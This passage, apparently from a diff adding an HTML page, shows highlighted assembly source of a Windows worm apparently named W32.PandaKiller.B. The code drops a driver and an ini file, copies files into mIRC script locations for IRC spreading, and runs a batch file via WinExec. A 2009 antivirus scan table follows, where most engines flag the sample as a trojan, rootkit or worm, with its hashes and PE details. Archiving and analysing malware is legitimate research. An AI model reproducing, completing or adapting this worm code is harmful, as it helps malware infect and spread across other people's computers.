+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drv</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">drvsize</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drvd</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">inisize</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inid</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+</span><span class="sc5">COPIE_MIRC</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script2</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script3</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script4</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
+
+</span><span class="sc5">WinExecBat</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc0">
+
+</span><span class="sc5">FIN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
+
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">REGISTRE</span><span class="sc0">
+</span><br><br><span class="sc0"><table border="1"><tr><td colspan="4">File W32.PandaKiller.B.exe received on 2009.06.10 03:34:05 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">Win32.SuspectCrc!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td style="color: red;">Win-Trojan/Pasta.8192</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">TR/Agent.8192.506</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Trojan/Win32.Pasta</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td>-</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">Win32:Rootkit-gen</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">Generic13.AQSR</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">Generic.Malware.SIsp!.664610C1</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td>-</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td>-</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td>-</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">Trojan.MulDrop.origin</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">Win32.HEURMalware</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td>-</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td>-</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Trojan.Win32.Pasta.ps</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">PossibleThreat</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">Generic.Malware.SIsp!.664610C1</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td style="color: red;">Trojan.Win32.Pasta.ps</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Trojan.Win32.Pasta.ps</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">Generic.dx!du</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">Generic.dx!du</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Trojan.Agent.8192.506</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td>-</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">probably unknown NewHeur_PE</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">W32/P2PWorm</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">Trj/CI.A</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">IRC.Sensi.B</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td style="color: red;">High Risk Worm</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td>-</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">Mal/Generic-A</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td style="color: red;">BehavesLike.Win32.Malware (v)</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">W95.Pet_Tick.gen</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td>-</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td>-</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td>-</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td>-</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 8192 bytes</td></tr><tr><td colspan="4">MD5...: 58c6c31028ac1b84cc73eb13300f21da</td></tr><tr><td colspan="4">SHA1..: a73cf795bc76385b71158a64cc770a813b399b74</td></tr><tr><td colspan="4">SHA256: 047bf03fe5eb9bc851ed98ce907c54127bb047859a33c2595b8c2978c54c423f</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Win32 Executable Generic (38.4%)<br>Win32 Dynamic Link Library (generic) (34.1%)<br>Win16/32 Executable Delphi generic (9.3%)<br>Generic Win/DOS Executable (9.0%)<br>DOS Executable Generic (9.0%)</td></tr><tr><td colspan="4">PEInfo: PE Structure information<br><br>( base data )<br>entrypointaddress.: 0x1000<br>timedatestamp.....: 0x54e23ab0 (Mon Feb 16 18:45:04 2015)<br>machinetype.......: 0x14c (I386)<br><br>( 4 sections )<br>name        viradd    virsiz   rawdsiz  ntrpy  md5<br>CODE        0x1000    0x1000     0x400   3.14  37b02d474fc48d0ef57d0b94cefd15a6<br>DATA        0x2000    0x1000     0xe00   2.35  218b438742b341f580359c2698adca85<br>.idata      0x3000    0x1000     0x200   3.71  42b128815c643a5972dc0e95202ff2de<br>.reloc      0x4000    0x1000     0x200   2.05  4f8358681f5e6552fba057879d30cbc2<br><br>( 2 imports )  <br>&gt; ADVAPI32.dll: RegCreateKeyExA, RegCloseKey, RegSetValueExA<br>&gt; KERNEL32.dll: CreateDirectoryA, WinExec, CreateFileA, CopyFileA, GetModuleFileNameA, GetModuleHandleA, GetWindowsDirectoryA, ExitProcess, WriteFile, lstrcat, CloseHandle<br><br>( 0 exports ) <br></td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr><tr></tr></table></span></div></body>
+</html>
